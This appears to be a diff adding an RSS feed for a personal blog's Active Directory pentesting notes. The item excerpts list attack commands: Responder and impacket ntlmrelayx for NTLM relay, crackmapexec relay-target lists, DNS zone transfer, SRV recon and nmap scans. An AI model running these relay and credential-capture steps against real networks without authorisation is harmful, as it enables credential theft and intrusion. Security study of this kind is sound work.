@@ -1,0 +1,58 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>🧙‍♂️ Active Directory on AlrikRr&#39;s Blog</title>
+    <link>https://AlrikRr.github.io/notes/active-directory/</link>
+    <description>Recent content in 🧙‍♂️ Active Directory on AlrikRr&#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language><atom:link href="https://AlrikRr.github.io/notes/active-directory/index.xml" rel="self" type="application/rss+xml" /><item>
+      <title>NTLM-Relay</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/attacks/ntlm-relay/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/attacks/ntlm-relay/</guid>
+      <description>NTLM-Relay Multi-Targets First gather all the ips that do not require smb signing
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt Then edit responder configuration
+sudo vim /usr/share/responder/responder.conf Turn off the SMB and HTTP option, then run
+sudo responder -I ppp0 -v Once the responder is up, you can run ntlm relay attack using impacket tools
+ntlmrelayx.py -t 192.168.64.129 -smb2support ntlmrelayx.py -tf targets.txt -smb2support -i More about it :
+viperone blog fox-it NTLM-Relay One-Shot The hacker (192.</description>
+    </item>
+    
+    <item>
+      <title>DNS Attacks</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/attacks/dns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/attacks/dns/</guid>
+      <description> Zone Transfer dig axfr xyz.local@dc01.xyz.local </description>
+    </item>
+    
+    <item>
+      <title>0️⃣ Recon AD</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/0-recon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/0-recon/</guid>
+      <description>DNS Recon dig -t SRV _ldap._tcp.dc._msdcs.domainnam You may easily obtain the IP of the DNS, which serves as the primary domain controller, by using the domain name as a target.
+dig -t SRV _gc._tcp.domainname dig -t SRV __kerberos.__tcp._tcp.domainname dig -t SRV _kpasswd._tcp._tcp.domainname Don&amp;rsquo;t forget to add the local domain inside the /etc/hosts file.
+Get DFL of Domain &amp;amp; Forest If you have the DFL, you can easily check whether the network uses legacy protocol.</description>
+    </item>
+    
+    <item>
+      <title>1️⃣ Enum - No Credentials</title>
+      <link>https://AlrikRr.github.io/notes/active-directory/1-enum-no-creds/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://AlrikRr.github.io/notes/active-directory/1-enum-no-creds/</guid>
+      <description>SMB Hosts crackmapexec smb 192.168.1.0/24 nmap -Pn --script smb-vuln\* -p139,445 If SMBv1 not signed, get the lits of target for NTLM-relay attack
+crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt Check NTLM-Relay Multi-Targets
+Ping Sweep nmap -v -sn 192.168.1.0/24 -oG ping-sweep.txt grep Up ping-sweep.txt | cut -d &amp;#34; &amp;#34; -f 2 Nmap Scans Quick Scan
+nmap -Pn -sV --top-ports 50 --open Classic Scan
+nmap -Pn -sC -sV &amp;lt;ip\&amp;gt; Full Scan
+nmap -Pn -sC -sV -p- &amp;lt;ip\&amp;gt; UDP Scan</description>
+    </item>
+    
+    
+  </channel>
+</rss>
